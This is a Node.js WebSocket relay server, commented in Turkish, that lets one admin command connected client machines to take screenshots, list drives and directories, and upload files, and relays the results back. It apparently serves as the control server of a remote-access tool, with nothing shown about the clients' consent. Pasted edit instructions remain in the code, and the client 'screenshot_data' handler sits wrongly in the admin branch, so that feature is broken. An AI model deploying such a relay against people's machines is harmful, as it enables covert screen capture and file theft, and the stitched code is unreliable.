const http = require("http");
const WebSocket = require("ws");

const PORT = process.env.PORT || 10000;
const AUTH_TOKEN = process.env.AUTH_TOKEN || "change-this-token";

const server = http.createServer((req, res) => {
  res.writeHead(200);
  res.end("OK");
});

const wss = new WebSocket.Server({ server });

server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

const clients = new Map();
let adminSocket = null;

function send(ws, data) {
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify(data));
  }
}

function broadcastToAdmin(data) {
  send(adminSocket, data);
}

function getClient(targetId) {
  return clients.get(targetId);
}

function sendClientNotFound(ws) {
  return send(ws, {
    type: "error",
    message: "Client not found"
  });
}

wss.on("connection", (ws) => {
  console.log("Yeni WebSocket bağlantısı geldi.");

  ws.isAuthed = false;
  ws.role = null;
  ws.clientId = null;

  ws.on("message", (raw) => {
    let msg;

    try {
      msg = JSON.parse(raw.toString());
    } catch {
      return send(ws, {
        type: "error",
        message: "Invalid JSON"
      });
    }

    // AUTH
    if (!ws.isAuthed) {
      if (msg.type !== "auth" || msg.token !== AUTH_TOKEN) {
        return send(ws, {
          type: "error",
          message: "Unauthorized"
        });
      }

      ws.isAuthed = true;
      ws.role = msg.role;

      if (msg.role === "admin") {
        adminSocket = ws;

        console.log("Admin bağlandı.");

        return send(ws, {
          type: "auth_ok",
          role: "admin",
          clients: Array.from(clients.keys())
        });
      }

      if (msg.role === "client") {
        if (!msg.clientId) {
          return send(ws, {
            type: "error",
            message: "Missing clientId"
          });
        }

        ws.clientId = msg.clientId;
        clients.set(ws.clientId, ws);

        console.log("Client bağlandı:", ws.clientId);

        broadcastToAdmin({
          type: "client_connected",
          clientId: ws.clientId
        });

        return send(ws, {
          type: "auth_ok",
          role: "client",
          clientId: ws.clientId
        });
      }

      return send(ws, {
        type: "error",
        message: "Invalid role"
      });
    }

    // ADMIN MESAJLARI
    if (ws.role === "admin") {
      if (msg.type === "list_clients") {
        return send(ws, {
          type: "clients",
          clients: Array.from(clients.keys())
        });
      }

      if (msg.type === "ping_client") {
        const target = getClient(msg.targetId);
        if (!target) return sendClientNotFound(ws);

        return send(target, {
          type: "ping",
          from: "admin"
        });
      }

      if (msg.type === "send_message") {
        const target = getClient(msg.targetId);
        if (!target) return sendClientNotFound(ws);

        return send(target, {
          type: "message",
          text: String(msg.text || "")
        });
      }

      if (msg.type === "open_notepad") {
        const target = getClient(msg.targetId);
        if (!target) return sendClientNotFound(ws);

        return send(target, {
          type: "open_notepad"
        });
      }

      // ADMIN MESAJLARI kısmına (request_screenshot_save'dan sonra) şunu ekleyin:

if (msg.type === "request_screenshot") {
  const target = getClient(msg.targetId);
  if (!target) return sendClientNotFound(ws);

  return send(target, {
    type: "request_screenshot"
  });
}

// CLIENT MESAJLARI kısmına şunu ekleyin:

if (msg.type === "screenshot_data") {
  return broadcastToAdmin({
    type: "screenshot_data",
    clientId: ws.clientId,
    base64: String(msg.base64 || ""),
    timestamp: Date.now()
  });
}

      if (msg.type === "list_drives") {
        const target = getClient(msg.targetId);
        if (!target) return sendClientNotFound(ws);

        return send(target, {
          type: "list_drives"
        });
      }

      if (msg.type === "list_directory") {
        const target = getClient(msg.targetId);
        if (!target) return sendClientNotFound(ws);

        return send(target, {
          type: "list_directory",
          path: String(msg.path || "")
        });
      }

      if (msg.type === "request_screenshot_save") {
  const target = getClient(msg.targetId);
  if (!target) return sendClientNotFound(ws);

  return send(target, {
    type: "request_screenshot_save"
  });
}

      if (msg.type === "request_shared_file") {
  const target = getClient(msg.targetId);
  if (!target) return sendClientNotFound(ws);

  return send(target, {
    type: "request_shared_file",
    path: String(msg.path || "")
  });
}

      return send(ws, {
        type: "error",
        message: "Unknown admin message type"
      });
    }

    // CLIENT MESAJLARI
    if (ws.role === "client") {
      if (msg.type === "pong") {
        return broadcastToAdmin({
          type: "client_pong",
          clientId: ws.clientId
        });
      }

      if (msg.type === "status") {
        return broadcastToAdmin({
          type: "client_status",
          clientId: ws.clientId,
          status: msg.status || {}
        });
      }

      if (msg.type === "drives_result") {
        return broadcastToAdmin({
          type: "drives_result",
          clientId: ws.clientId,
          drives: Array.isArray(msg.drives) ? msg.drives : []
        });
      }

      if (msg.type === "directory_result") {
        return broadcastToAdmin({
          type: "directory_result",
          clientId: ws.clientId,
          path: String(msg.path || ""),
          items: Array.isArray(msg.items) ? msg.items : []
        });
      }

      if (msg.type === "directory_error") {
        return broadcastToAdmin({
          type: "directory_error",
          clientId: ws.clientId,
          path: String(msg.path || ""),
          message: String(msg.message || "Directory error")
        });
      }

      if (msg.type === "shared_file_data") {
        return broadcastToAdmin({
          type: "shared_file_data",
          clientId: ws.clientId,
          fileName: String(msg.fileName || ""),
          base64: String(msg.base64 || "")
        });
      }

      if (msg.type === "shared_file_error") {
        return broadcastToAdmin({
          type: "shared_file_error",
          clientId: ws.clientId,
          fileName: String(msg.fileName || ""),
          message: String(msg.message || "Shared file error")
        });
      }

      return send(ws, {
        type: "error",
        message: "Unknown client message type"
      });
    }
  });

  ws.on("close", () => {
    console.log("Bağlantı kapandı:", ws.role, ws.clientId);

    if (ws.role === "client" && ws.clientId) {
      clients.delete(ws.clientId);

      broadcastToAdmin({
        type: "client_disconnected",
        clientId: ws.clientId
      });
    }

    if (ws.role === "admin" && adminSocket === ws) {
      adminSocket = null;
    }
  });

  ws.on("error", (err) => {
    console.log("WebSocket hata:", err.message);
  });
});

console.log(`WebSocket relay running on port ${PORT}`);
